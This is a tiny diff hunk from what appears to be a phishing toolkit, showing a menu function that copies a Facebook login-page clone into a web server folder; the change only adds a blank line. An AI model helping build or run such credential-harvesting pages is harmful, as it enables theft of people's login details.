@@ -258,6 +258,7 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
     except:
         pass
 
+
     if custom_option == '1' and page == 'Facebook':
         webpage_set("WebPages/fb_standard/", "Server/www/")
     elif custom_option == '2' and page == 'Facebook':
